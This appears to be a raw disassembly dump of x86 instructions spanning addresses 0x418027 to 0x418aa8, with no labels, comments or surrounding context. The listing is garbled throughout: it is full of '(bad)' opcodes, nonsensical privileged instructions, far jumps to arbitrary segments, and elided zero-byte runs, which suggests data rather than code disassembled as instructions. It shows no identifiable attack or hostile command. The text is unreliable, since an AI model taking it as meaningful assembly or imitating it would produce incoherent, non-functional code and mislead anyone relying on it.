  418027:	js     0x417fd3
  418029:	dec    edi
  41802a:	push   esi
  41802b:	popf   
  41802c:	cmc    
  41802d:	leave  
  41802e:	rcr    BYTE PTR [ecx-0x11],cl
  418031:	push   edi
  418032:	cmp    DWORD PTR [eax+edi*1],ebx
  418035:	loopne 0x417fe2
  418037:	cmp    ecx,esi
  418039:	jle    0x417feb
  41803b:	dec    esp
  41803c:	into   
  41803d:	ror    BYTE PTR [edi-0x208c5ed1],0xad
  418044:	or     DWORD PTR [eax+edx*1+0x49],eax
  418048:	or     edi,DWORD PTR [ecx-0x752ae2fb]
  41804e:	shl    BYTE PTR [ebp-0x3ffcdeaf],0x65
  418055:	sbb    eax,0x364e5bd1
  41805a:	push   cs
  41805b:	out    dx,al
  41805c:	test   eax,0x6e5a5db1
  418061:	sbb    dh,BYTE PTR [ecx-0x63]
  418064:	mov    edi,0x613aea8f
  418069:	inc    esp
  41806a:	pop    es
  41806b:	sbb    al,0xba
  41806d:	pop    edx
  41806e:	xchg   edi,eax
  41806f:	jno    0x417ff6
  418071:	outs   dx,DWORD PTR ds:[esi]
  418072:	inc    ecx
  418073:	push   ss
  418074:	pop    es
  418075:	adc    eax,0x221bcba1
  41807a:	pusha  
  41807b:	xor    DWORD PTR [ebp-0x767fcbae],edx
  418081:	mov    cl,0xf2
  418083:	mov    eax,0x8a267150
  418088:	aas    
  418089:	sti    
  41808a:	add    DWORD PTR [edi+ecx*1+0x6b],ebx
  41808e:	(bad)  
  41808f:	fs repnz gs rcr al,1
  418094:	xor    ebx,DWORD PTR [ebx-0x73cce34a]
  41809a:	or     ebp,edi
  41809c:	fnstenv [edx+0x572f1692]
  4180a2:	les    ebx,FWORD PTR [edx+0x74]
  4180a5:	repz and cl,bh
  4180a8:	and    esi,DWORD PTR [eax]
  4180aa:	stos   BYTE PTR es:[edi],al
  4180ab:	xchg   edi,eax
  4180ac:	data16 sub al,0xe7
  4180af:	inc    edx
  4180b0:	cli    
  4180b1:	xchg   BYTE PTR [edi-0x5668911c],cl
  4180b7:	lea    esi,[edi-0x1a]
  4180ba:	sub    al,0xf4
  4180bc:	loopne 0x418124
  4180be:	scas   al,BYTE PTR es:[edi]
  4180bf:	ins    DWORD PTR es:[edi],dx
  4180c0:	jbe    0x4180cd
  4180c2:	sbb    edx,ebx
  4180c4:	out    dx,eax
  4180c5:	mov    cl,0x33
  4180c7:	not    BYTE PTR [ebx]
  4180c9:	mov    ebp,0xda3d1576
  4180ce:	lods   eax,DWORD PTR ds:[esi]
  4180cf:	popf   
  4180d0:	cmp    edx,ebp
  4180d2:	scas   eax,DWORD PTR es:[edi]
  4180d3:	sbb    ecx,eax
  4180d5:	pop    ecx
  4180d6:	aam    0xa2
  4180d8:	mov    ecx,ebx
  4180da:	jmp    0x423e050d
  4180df:	aaa    
  4180e0:	cmp    al,BYTE PTR [esi+0x4a]
  4180e3:	out    0xa5,eax
  4180e5:	fadd   QWORD PTR ds:0x1b946c92
  4180eb:	arpl   WORD PTR [eax+eax*1+0x0],ax
	...
  418153:	add    BYTE PTR [eax],al
  418155:	add    BYTE PTR [ecx-0xba9482],ch
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xe72fdebc,eax
  418163:	adc    BYTE PTR [edx],al
  418165:	xor    bh,BYTE PTR [ebx]
  418167:	add    eax,DWORD PTR [ecx]
  418169:	add    bh,bh
  41816b:	add    BYTE PTR [eax],al
  41816d:	add    dh,dh
  41816f:	add    BYTE PTR [esp+ecx*1+0x17],0x4d
  418174:	jmp    0x5a93:0x942526a7
  41817b:	shr    ebp,0x8a
  41817e:	pushw  cs
  418180:	dec    ebx
  418181:	pop    esi
  418182:	jp     0x41815d
  418184:	cdq    
  418185:	add    ebp,ecx
  418187:	mov    dh,0x9a
  418189:	fsubr  DWORD PTR [edx]
  41818b:	loop   0x41817f
  41818d:	std    
  41818e:	adc    dh,ah
  418190:	cli    
  418191:	nop
  418192:	leave  
  418193:	fistp  DWORD PTR [edx+0x2e]
  418196:	inc    esp
  418197:	ds inc esp
  418199:	mov    bh,0x60
  41819b:	push   cs
  41819c:	data16 das 
  41819e:	cmp    dl,BYTE PTR [esi-0x70]
  4181a1:	push   ebx
  4181a2:	mov    bh,BYTE PTR [edi]
  4181a4:	sti    
  4181a5:	dec    edx
  4181a6:	mov    bh,BYTE PTR [ebx]
  4181a8:	add    eax,DWORD PTR [esi]
  4181aa:	cli    
  4181ab:	mov    esi,0x8d4915a8
  4181b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181b1:	push   esi
  4181b2:	test   eax,0xb23a36c4
  4181b7:	shr    DWORD PTR [ecx+0x6f747522],1
  4181bd:	cld    
  4181be:	push   edx
  4181bf:	push   0x57c38988
  4181c4:	(bad)  
  4181c5:	push   ss
  4181c6:	jp     0x4181ed
  4181c8:	scas   al,BYTE PTR es:[edi]
  4181c9:	retf   0x8835
  4181cc:	iret   
  4181cd:	and    DWORD PTR [ecx],ebp
  4181cf:	sub    ecx,eax
  4181d1:	icebp  
  4181d2:	(bad)  
  4181d3:	mov    esp,0xa1d7d0eb
  4181d8:	loopne 0x41823e
  4181da:	mov    bl,0xe1
  4181dc:	push   esp
  4181dd:	fsub   QWORD PTR [ecx+0x36]
  4181e0:	std    
  4181e1:	jge    0x4181ea
  4181e3:	push   esi
  4181e4:	fwait
  4181e5:	mov    al,ds:0xc4af4779
  4181ea:	xchg   esi,eax
  4181eb:	test   DWORD PTR [eax],ebx
  4181ed:	(bad)  
  4181ee:	addr16 ret 0xc47d
  4181f2:	pushf  
  4181f3:	out    dx,al
  4181f4:	or     al,0xb3
  4181f6:	nop
  4181f7:	jl     0x41820d
  4181f9:	inc    eax
  4181fa:	mov    ds:0x7a7b4de3,eax
  4181ff:	neg    BYTE PTR [ebx-0x1af1e3b2]
  418205:	dec    ebx
  418206:	adc    ebp,DWORD PTR [esi]
  418208:	dec    ecx
  418209:	fwait
  41820a:	js     0x41823a
  41820c:	xchg   edx,eax
  41820d:	clc    
  41820e:	jle    0x4181c4
  418210:	cmp    ebx,DWORD PTR [eax+eiz*8]
  418213:	jae    0x4181ba
  418215:	ror    ch,1
  418217:	jno    0x4181c0
  418219:	jb     0x418245
  41821b:	out    0xd4,eax
  41821d:	fsubr  QWORD PTR [ebp+0x51]
  418220:	retf   
  418221:	fisttp WORD PTR [ebx+0x54]
  418224:	imul   edi,edi,0x17
  418227:	aas    
  418228:	test   eax,0xcbd9c931
  41822d:	jl     0x418224
  41822f:	and    eax,0x988a8af4
  418234:	adc    cl,0x73
  418237:	leave  
  418238:	mov    ebp,0x3f008568
  41823d:	push   edi
  41823e:	stos   BYTE PTR es:[edi],al
  41823f:	cs sbb eax,0x9157272b
  418245:	jbe    0x41829c
  418247:	outs   dx,BYTE PTR ds:[esi]
  418248:	mov    esi,0x64cd923f
  41824d:	mov    WORD PTR [ecx-0x4b],?
  418250:	mov    al,0x86
  418252:	aas    
  418253:	cmp    DWORD PTR [ebx],esi
  418255:	jecxz  0x41827a
  418257:	cmp    BYTE PTR [ebp-0x22969919],ah
  41825d:	inc    edx
  41825e:	jg     0x418248
  418260:	mov    ds:0x84a3087b,eax
  418265:	dec    ebp
  418266:	int3   
  418267:	fs pop ecx
  418269:	retf   
  41826a:	jo     0x41828d
  41826c:	sbb    BYTE PTR [eax],al
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x6debb8d6
  4182e4:	sub    esi,DWORD PTR [edi+0x3a]
  4182e7:	add    al,0x1
  4182e9:	add    bh,bh
  4182eb:	add    BYTE PTR [eax],al
  4182ed:	add    BYTE PTR [esi-0x38],dh
  4182f0:	mov    ah,0x65
  4182f2:	icebp  
  4182f3:	cs mov ebp,0x30a948a4
  4182f9:	adc    eax,0xbae3c338
  4182fe:	xchg   DWORD PTR [esi+0x5b],ecx
  418301:	daa    
  418302:	and    DWORD PTR [edi+0x20],esi
  418305:	(bad)  
  418306:	cmp    ecx,DWORD PTR [ecx+0x7e]
  418309:	inc    edx
  41830a:	inc    ebp
  41830b:	mov    edx,DWORD PTR [ebp+0x5145de9c]
  418311:	or     al,0xe5
  418313:	mov    ah,BYTE PTR [ebp-0xa647815]
  418319:	into   
  41831a:	sub    esp,0x3a565ee9
  418320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418322:	add    BYTE PTR [ebx+0x6d14154c],bl
  418328:	add    esi,DWORD PTR [esi+0x1ade6576]
  41832e:	dec    ebx
  41832f:	cdq    
  418330:	jge    0x4182dc
  418332:	scas   al,BYTE PTR es:[edi]
  418333:	xchg   DWORD PTR [eax],ebx
  418335:	jo     0x41833e
  418337:	ja     0x418378
  418339:	add    al,0xc1
  41833b:	aad    0xdd
  41833d:	xor    ebp,DWORD PTR [ecx]
  41833f:	and    al,BYTE PTR [ecx-0x1b]
  418342:	mov    cl,0xff
  418344:	jp     0x41838a
  418346:	sub    ebp,DWORD PTR [edi]
  418348:	push   ebx
  418349:	or     BYTE PTR ss:[edi],bh
  41834c:	fwait
  41834d:	dec    ecx
  41834e:	xchg   esi,eax
  41834f:	pusha  
  418350:	ja     0x41831b
  418352:	or     ah,BYTE PTR [esi-0x2ad2cce4]
  418358:	mov    ah,0xaa
  41835a:	stos   DWORD PTR es:[edi],eax
  41835b:	add    cl,BYTE PTR [esi+0x1a]
  41835e:	jnp    0x4182f3
  418360:	iret   
  418361:	add    eax,DWORD PTR [esi+0x5fc9184e]
  418367:	popa   
  418368:	out    0x56,eax
  41836a:	push   eax
  41836b:	pop    eax
  41836c:	hlt    
  41836d:	cmp    ecx,DWORD PTR [edi+0x54]
  418370:	xchg   BYTE PTR [eax],bh
  418372:	loop   0x4183bc
  418374:	repz jmp FWORD PTR [ebp-0x261fc5d2]
  41837b:	sub    dl,0xe1
  41837e:	mov    dl,0x7c
  418380:	xchg   ecx,eax
  418381:	leave  
  418382:	and    eax,DWORD PTR [ebx+0x360a4cda]
  418388:	sbb    ebx,0xa7db22f6
  41838e:	mov    bh,0x8a
  418390:	inc    esp
  418391:	(bad)  
  418392:	jle    0x4183c5
  418394:	push   ss
  418395:	jo     0x4183d7
  418397:	popa   
  418398:	nop
  418399:	dec    eax
  41839a:	jg     0x4183cb
  41839c:	pop    ds
  41839d:	or     bh,BYTE PTR [edi+0x58]
  4183a0:	fimul  DWORD PTR [edi]
  4183a2:	jmp    0x5912f025
  4183a7:	dec    edi
  4183a8:	stc    
  4183a9:	ja     0x41836c
  4183ab:	pusha  
  4183ac:	cmp    DWORD PTR [esi+0x17],0xffffff80
  4183b0:	popa   
  4183b1:	jb     0x4183f0
  4183b3:	call   0xabe:0x6329f04d
  4183ba:	loopne 0x418388
  4183bc:	mov    eax,ds:0xac400bd7
  4183c1:	xchg   BYTE PTR ds:0xda45a3f7,ah
  4183c7:	sub    ebx,esi
  4183c9:	outs   dx,DWORD PTR ds:[esi]
  4183ca:	or     al,0x61
  4183cc:	mov    dl,0xbd
  4183ce:	xlat   BYTE PTR ds:[ebx]
  4183cf:	adc    ch,ah
  4183d1:	add    esp,0x5b
  4183d4:	jb     0x418438
  4183d6:	mov    bl,0x97
  4183d8:	jnp    0x41837b
  4183da:	popf   
  4183db:	fdivrp st(2),st
  4183dd:	ins    DWORD PTR es:[edi],dx
  4183de:	inc    esi
  4183df:	or     dh,BYTE PTR ds:0x66b91930
  4183e5:	sub    ebp,ebx
  4183e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183e8:	or     esp,DWORD PTR [ecx+0x201643]
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	shl    DWORD PTR [esi+0x2f],cl
  418465:	(bad)  
  418466:	cmp    DWORD PTR ds:0xff0001,eax
  41846c:	add    BYTE PTR [eax],al
  41846e:	(bad)  
  41846f:	fstp   QWORD PTR [edi+0x77af4110]
  418475:	inc    BYTE PTR [edx]
  418477:	test   esp,ecx
  418479:	fild   WORD PTR [ecx+0x10250072]
  41847f:	mov    dh,ah
  418481:	xor    al,BYTE PTR ds:0x12a96bfb
  418487:	fsubr  DWORD PTR [edi+0x6b]
  41848a:	enter  0xa951,0x1
  41848e:	fadd   DWORD PTR [ebx]
  418490:	jne    0x418502
  418492:	cwde   
  418493:	jne    0x4184f7
  418495:	and    cl,BYTE PTR [ebx]
  418497:	mov    dl,0x64
  418499:	addr16 push ss
  41849b:	mov    eax,0xb174b766
  4184a0:	cmp    DWORD PTR [eax],esp
  4184a2:	sar    BYTE PTR [edx+0x1e],cl
  4184a5:	pop    ebp
  4184a6:	sbb    dl,BYTE PTR [eax]
  4184a8:	loopne 0x4184ea
  4184aa:	fld    DWORD PTR [eax+edx*8+0x322ab0f1]
  4184b1:	outs   dx,BYTE PTR ds:[esi]
  4184b2:	jne    0x4184cb
  4184b4:	xor    al,0x10
  4184b6:	mov    ds,WORD PTR ds:0xab078a10
  4184bc:	repnz sbb DWORD PTR [ecx+0x4b],ebp
  4184c0:	repz sub bl,BYTE PTR [eax+0x26ae1f4]
  4184c7:	cmp    eax,0x252232df
  4184cc:	int    0xdd
  4184ce:	jp     0x41854c
  4184d0:	call   0x1ba1:0x53fcc43d
  4184d7:	mov    ah,0x4
  4184d9:	sbb    eax,0x827b2e40
  4184de:	sbb    al,0x38
  4184e0:	or     DWORD PTR fs:[ebp-0x3a],0x1ba7fe34
  4184e8:	sahf   
  4184e9:	inc    edi
  4184ea:	add    DWORD PTR fs:[ecx],0x744ac1b3
  4184f1:	stos   DWORD PTR es:[edi],eax
  4184f2:	loope  0x41854d
  4184f4:	xchg   ebp,eax
  4184f5:	arpl   di,bx
  4184f7:	outs   dx,DWORD PTR ds:[esi]
  4184f8:	(bad)  
  4184f9:	dec    edi
  4184fa:	test   eax,0xbb830b3e
  4184ff:	addr16 and eax,0x8370f857
  418505:	cs mov ch,bl
  418508:	aad    0x4
  41850a:	popa   
  41850b:	inc    edx
  41850c:	scas   al,BYTE PTR es:[edi]
  41850d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850e:	sub    DWORD PTR [edi-0x70215f25],ebx
  418514:	shl    BYTE PTR [edx+0x50],1
  418517:	push   0x8649183e
  41851c:	mov    ah,0x20
  41851e:	scas   al,BYTE PTR es:[edi]
  41851f:	and    DWORD PTR [ebx],0x48720b04
  418525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418526:	int3   
  418527:	dec    esp
  418528:	(bad)  
  41852a:	imul   esi,DWORD PTR [esp+eax*4+0x54bfb8bd],0x4
  418532:	adc    DWORD PTR [ebx],eax
  418534:	push   ebx
  418535:	adc    BYTE PTR [edx-0x233cc7b7],0xb7
  41853c:	jle    0x418544
  41853e:	inc    esp
  41853f:	dec    ecx
  418540:	add    edi,0x10
  418543:	sbb    DWORD PTR [ecx],0x5b
  418546:	repnz or eax,0x894ea878
  41854c:	cmp    al,0x12
  41854e:	in     eax,0x73
  418550:	push   0x61
  418552:	hlt    
  418553:	mov    esp,0xb37ba959
  418558:	xlat   BYTE PTR ds:[ebx]
  418559:	hlt    
  41855a:	adc    DWORD PTR [ecx-0x55],ebp
  41855d:	push   esp
  41855e:	gs inc edx
  418560:	jg     0x418594
  418562:	test   al,0xa6
  418564:	xchg   edi,eax
  418565:	xchg   DWORD PTR ds:0x32b12fa7,eax
  41856b:	arpl   cx,dx
	...
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	dec    ecx
  4185e3:	stos   BYTE PTR es:[edi],al
  4185e4:	scas   al,BYTE PTR es:[edi]
  4185e5:	retf   0x638
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	inc    DWORD PTR [eax]
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	pop    edx
  4185ef:	adc    al,BYTE PTR [ebx-0x736aea91]
  4185f5:	arpl   WORD PTR [edx],bx
  4185f7:	sub    eax,DWORD PTR [ecx]
  4185f9:	lock loop 0x41864c
  4185fc:	jg     0x41862f
  4185fe:	call   0x9e951c3
  418603:	gs mov ah,0x31
  418606:	aas    
  418607:	and    BYTE PTR [ebp+0x1a6ea5b0],0x8d
  41860e:	(bad)  
  41860f:	bound  edx,QWORD PTR [edi+0x35]
  418612:	aam    0x2a
  418614:	dec    eax
  418615:	add    BYTE PTR [edx-0x3a],dl
  418618:	jb     0x41868f
  41861a:	out    0xbe,eax
  41861c:	in     al,dx
  41861d:	push   edx
  41861e:	push   eax
  41861f:	test   eax,0xfaea49c2
  418624:	adc    al,0xb3
  418626:	daa    
  418627:	enter  0x5ae0,0xc4
  41862b:	jns    0x41868a
  41862d:	icebp  
  41862e:	xchg   DWORD PTR [ecx+esi*2],ecx
  418631:	int    0xe6
  418633:	nop
  418634:	xor    al,BYTE PTR [eax+eiz*8]
  418637:	gs stos BYTE PTR es:[edi],al
  418639:	mov    esi,0xf5a1d52e
  41863e:	ja     0x418627
  418640:	lahf   
  418641:	dec    esp
  418642:	or     edx,DWORD PTR [eax]
  418644:	cmp    eax,0xebf98d77
  418649:	fisub  WORD PTR [ecx-0x18]
  41864c:	imul   ebp,DWORD PTR [edx],0x65201d8a
  418652:	xor    edi,esp
  418654:	clc    
  418655:	dec    eax
  418656:	mov    bh,0xfc
  418658:	hlt    
  418659:	jne    0x41864f
  41865b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41865d:	cmp    BYTE PTR [eax+0x9514014],0xd4
  418664:	xchg   edi,eax
  418666:	mov    ebp,0x300e90a0
  41866b:	fcomp  DWORD PTR [ebp-0x48e51d55]
  418671:	ror    BYTE PTR [ecx],0x69
  418674:	fisub  WORD PTR [edx-0x1771696c]
  41867a:	adc    al,0x4d
  41867c:	cmp    al,0x9e
  41867e:	xor    DWORD PTR [ecx-0x7764d096],edx
  418684:	sub    DWORD PTR [edx-0x3e],eax
  418687:	sub    esi,0x233ad86e
  41868d:	cmp    BYTE PTR [ebp-0x38da67cf],0x74
  418694:	push   ebx
  418695:	jae    0x4186da
  418697:	jmp    0x418637
  418699:	repz int3 
  41869b:	adc    eax,0x630417d8
  4186a0:	pushf  
  4186a1:	pop    es
  4186a2:	sbb    ebp,DWORD PTR [edi]
  4186a4:	mov    WORD PTR [ebx],ds
  4186a6:	dec    ecx
  4186a7:	repnz sar BYTE PTR [ecx-0x3],1
  4186ab:	mov    ecx,esi
  4186ad:	push   eax
  4186ae:	fwait
  4186af:	xchg   ebp,eax
  4186b0:	mul    DWORD PTR [ebx+0xbc74475]
  4186b6:	mov    dl,0x93
  4186b8:	xor    DWORD PTR [eax+0x4df37b49],esp
  4186be:	or     BYTE PTR [eax+ecx*1+0x4a672454],ah
  4186c5:	shl    DWORD PTR [ebp+0x1e],cl
  4186c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186c9:	jbe    0x418684
  4186cb:	pop    eax
  4186cc:	ins    DWORD PTR es:[edi],dx
  4186cd:	dec    esp
  4186ce:	fisub  WORD PTR [eax]
  4186d0:	mov    dh,0xa0
  4186d2:	stos   DWORD PTR es:[edi],eax
  4186d3:	dec    eax
  4186d4:	(bad)  
  4186d5:	push   eax
  4186d6:	mov    eax,ds:0x2b86a96
  4186db:	mov    ebx,0xcae3b1ae
  4186e0:	cmp    dl,BYTE PTR [ebp+0x13653ff4]
  4186e6:	arpl   WORD PTR [edi-0x3f62ef93],di
  4186ec:	adc    al,0x0
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	fsub   DWORD PTR [ebp+0x737a978]
  418768:	add    DWORD PTR [eax],eax
  41876a:	inc    DWORD PTR [eax]
  41876c:	add    BYTE PTR [eax],al
  41876e:	in     eax,0x8
  418770:	pop    eax
  418771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418772:	sub    al,0xb5
  418774:	shr    BYTE PTR [edi-0x50],cl
  418777:	push   eax
  418778:	push   es
  418779:	rol    BYTE PTR [eax+0x4],cl
  41877c:	or     BYTE PTR [edx+0x51],ah
  41877f:	or     bh,al
  418781:	jecxz  0x4187e6
  418783:	out    0x4a,al
  418785:	mov    ds:0xdfa6c1a7,al
  41878a:	or     ah,BYTE PTR [eax+0x5e575e38]
  418790:	int3   
  418791:	mov    ebx,0xcc194a43
  418796:	cmp    BYTE PTR [eax+0x326c6bf3],ah
  41879c:	test   ecx,ecx
  41879e:	outs   dx,DWORD PTR ds:[esi]
  41879f:	ins    BYTE PTR es:[edi],dx
  4187a0:	push   esp
  4187a1:	iret   
  4187a2:	(bad)  
  4187a3:	sub    edi,ebp
  4187a5:	data16 (bad) 
  4187a7:	repz mov bl,BYTE PTR [ebx+0x49]
  4187ab:	sub    al,0x8f
  4187ad:	adc    ecx,DWORD PTR [edx]
  4187af:	repz cmp WORD PTR [ebx+0x7b],si
  4187b4:	pop    ebp
  4187b5:	xchg   DWORD PTR [edi-0x79ec7f9d],esi
  4187bb:	pop    esp
  4187bc:	lock mov ah,0xc6
  4187bf:	push   ebx
  4187c0:	retf   0xcda7
  4187c3:	sub    bh,BYTE PTR [ebx-0x15168ce8]
  4187c9:	sub    ebp,DWORD PTR [eax]
  4187cb:	push   edi
  4187cc:	shl    DWORD PTR ds:0x9bf8f5d9,1
  4187d2:	aam    0xf6
  4187d4:	adc    BYTE PTR [edx],cl
  4187d6:	(bad)
  4187da:	mov    cl,0x0
  4187dc:	push   ebp
  4187dd:	xor    al,0xe1
  4187df:	or     eax,0xcc83d118
  4187e4:	pusha  
  4187e5:	std    
  4187e6:	xchg   edi,eax
  4187e7:	mov    dh,0x6c
  4187e9:	pop    ds
  4187ea:	and    dh,cl
  4187ec:	and    BYTE PTR [edi+0x22],ah
  4187ef:	xchg   edi,eax
  4187f0:	pop    edx
  4187f1:	add    eax,0x24ec8527
  4187f6:	sbb    DWORD PTR [edx-0x69],ecx
  4187f9:	into   
  4187fa:	pusha  
  4187fb:	mov    eax,ds:0x15c5ebf7
  418800:	jmp    0xea83b93c
  418805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418806:	sbb    BYTE PTR [eax-0x7da725d1],0xfe
  41880d:	rcr    DWORD PTR [esi],1
  41880f:	cmc    
  418810:	and    ch,bl
  418812:	inc    ebx
  418813:	pop    ss
  418814:	xchg   ebx,eax
  418815:	push   edx
  418816:	scas   eax,DWORD PTR es:[edi]
  418817:	mov    esi,0x9a52acd2
  41881c:	ret    0xce93
  41881f:	nop
  418820:	loopne 0x41888d
  418822:	es pop esi
  418824:	repz loop 0x4187e7
  418827:	jecxz  0x418886
  418829:	pop    edx
  41882a:	jmp    0x418810
  41882c:	scas   al,BYTE PTR es:[edi]
  41882d:	lods   eax,DWORD PTR ds:[esi]
  41882e:	in     eax,0xd5
  418830:	je     0x418876
  418832:	mov    ebp,0xc498eca6
  418837:	dec    ebx
  418838:	ror    BYTE PTR [esi],cl
  41883a:	ror    DWORD PTR [ebx],cl
  41883c:	sbb    DWORD PTR [ebx-0x6b],0xffffffb0
  418840:	(bad)  [edi-0x50aa247d]
  418846:	add    esi,DWORD PTR [esi]
  418848:	push   ecx
  418849:	adc    cl,ch
  41884b:	iret   
  41884c:	sub    BYTE PTR [ebx+0x5c],dl
  41884f:	xor    bh,cl
  418851:	es cmc 
  418853:	loopne 0x4188c8
  418855:	or     eax,edi
  418857:	adc    eax,0xde01aa33
  41885c:	icebp  
  41885d:	(bad)  
  41885e:	cli    
  41885f:	sahf   
  418860:	adc    ecx,DWORD PTR [eax+0x3fe141fd]
  418866:	mov    ds:0xeb35dab0,eax
  41886b:	das    
  41886c:	rol    BYTE PTR [eax],0x0
	...
  4188d3:	add    BYTE PTR [eax],al
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi-0x5963c533]
  4188e3:	in     al,dx
  4188e4:	adc    al,0x19
  4188e6:	or     BYTE PTR ss:[ecx],al
  4188e9:	add    bh,bh
  4188eb:	add    BYTE PTR [eax],al
  4188ed:	add    BYTE PTR [edi],dh
  4188ef:	repz sub al,0xe2
  4188f2:	retf   0x9ee7
  4188f5:	jbe    0x41893c
  4188f7:	cdq    
  4188f8:	mov    ebp,0xf0aa6fd1
  4188fd:	jnp    0x41896e
  4188ff:	dec    eax
  418900:	push   esp
  418901:	lds    ecx,FWORD PTR [ebx+esi*1-0x1d]
  418905:	cdq    
  418906:	hlt    
  418907:	mov    eax,0x332996
  41890c:	arpl   WORD PTR ds:0x104b79d9,bp
  418912:	add    al,0x73
  418914:	push   edx
  418915:	jne    0x418955
  418917:	add    eax,0xdc6c1964
  41891c:	std    
  41891d:	test   DWORD PTR fs:[edi+eax*8+0x611bbdd4],eax
  418925:	jge    0x418904
  418927:	aad    0xb0
  418929:	inc    esi
  41892a:	mov    dh,0x35
  41892c:	mov    dh,0xb1
  41892e:	cs pop esi
  418930:	mov    bh,bh
  418932:	mov    ah,0x7b
  418934:	test   eax,0xf5a18c40
  418939:	xchg   ebx,eax
  41893a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41893b:	fucomi st,st(0)
  41893d:	xor    DWORD PTR [edi+0x4c],0x9
  418941:	pop    ss
  418942:	jmp    0x4188ff
  418944:	aad    0x96
  418946:	mov    ebx,0x81336d1b
  41894b:	icebp  
  41894c:	data16 es out dx,al
  41894f:	add    edx,DWORD PTR [ecx]
  418951:	stos   BYTE PTR es:[edi],al
  418952:	pop    ebx
  418953:	sbb    DWORD PTR [eax-0x23],ebp
  418956:	mov    cs,WORD PTR [edx+0x5f365a4]
  41895c:	dec    eax
  41895d:	rcl    BYTE PTR [ebx+0x45],cl
  418960:	dec    esp
  418961:	jne    0x4189d0
  418963:	aaa    
  418964:	outs   dx,BYTE PTR ds:[esi]
  418965:	xchg   edi,eax
  418966:	or     DWORD PTR [esi+eax*4],eax
  418969:	cmc    
  41896a:	push   0x28
  41896c:	xor    BYTE PTR [esi],bh
  41896e:	jae    0x41890b
  418970:	adc    al,0xe6
  418972:	idiv   BYTE PTR [eax]
  418974:	cdq    
  418975:	loope  0x41893f
  418977:	jmp    0x7409:0xf29ce48a
  41897e:	ins    DWORD PTR es:[edi],dx
  41897f:	lea    edx,[ebx+0xc]
  418982:	stc    
  418983:	loopne 0x418975
  418985:	add    cl,bl
  418987:	jl     0x4189eb
  418989:	xchg   ebx,eax
  41898a:	mov    dl,0x7b
  41898c:	shl    BYTE PTR [esi],cl
  41898e:	add    ax,0x23f4
  418992:	inc    eax
  418993:	push   esi
  418994:	xchg   DWORD PTR [edx-0x4c],edx
  418997:	(bad)  
  418999:	cdq    
  41899a:	leave  
  41899b:	and    al,0xe9
  41899d:	aam    0x2c
  41899f:	(bad)  
  4189a0:	dec    esp
  4189a1:	mov    edx,0xd59a404f
  4189a6:	pop    ss
  4189a7:	push   ebp
  4189a8:	into   
  4189a9:	xchg   BYTE PTR [edi-0x63831c11],ah
  4189af:	cli    
  4189b0:	(bad)  [esi+0x49]
  4189b3:	mov    WORD PTR [edi-0x38],cs
  4189b6:	gs mov esp,0xb6d80c4f
  4189bc:	xchg   edx,eax
  4189bd:	je     0x418a29
  4189bf:	sub    al,0xa4
  4189c1:	lods   al,BYTE PTR ds:[esi]
  4189c2:	dec    esi
  4189c3:	inc    DWORD PTR gs:[esp+ebp*8-0x3a664cc9]
  4189cb:	lock jmp 0x6784:0xc1ff7514
  4189d3:	mov    DWORD PTR [edi],edx
  4189d5:	nop    DWORD PTR [ebx-0x722b5b33]
  4189dc:	push   es
  4189dd:	jle    0x418961
  4189df:	ins    DWORD PTR es:[edi],dx
  4189e0:	leave  
  4189e1:	jecxz  0x41898e
  4189e3:	jg     0x4189df
  4189e5:	fwait
  4189e6:	jne    0x418a5d
  4189e8:	lods   eax,DWORD PTR ds:[esi]
  4189e9:	scas   al,BYTE PTR es:[edi]
  4189ea:	sbb    BYTE PTR [ebx],0xb9
	...
  418a55:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x93c81769
  418a65:	xor    DWORD PTR ds:0xff000109,0x0
  418a6c:	add    BYTE PTR [eax],al
  418a6e:	adc    DWORD PTR [edi-0x65],edx
  418a71:	or     al,0x6b
  418a73:	pop    ds
  418a74:	jno    0x418a9c
  418a76:	sub    esi,ebp
  418a78:	xchg   esp,eax
  418a79:	cmp    BYTE PTR [edi],al
  418a7b:	add    BYTE PTR [ebp+0xa],bh
  418a7e:	lahf   
  418a7f:	(bad)  
  418a80:	retf   
  418a81:	in     al,0xc0
  418a83:	pop    es
  418a84:	mov    esp,0xf1217ea6
  418a89:	scas   al,BYTE PTR es:[edi]
  418a8a:	call   0x26d72e68
  418a8f:	xchg   edx,eax
  418a90:	lahf   
  418a91:	fcomp  DWORD PTR [ebp+0x20]
  418a94:	(bad)  
  418a95:	adc    eax,0x615c2763
  418a9a:	mov    dl,0x3
  418a9c:	push   0x7b
  418a9e:	ja     0x418a3d
  418aa0:	mov    bh,0x9
  418aa2:	gs mov edx,0x85083a06
  418aa8:	sahf   
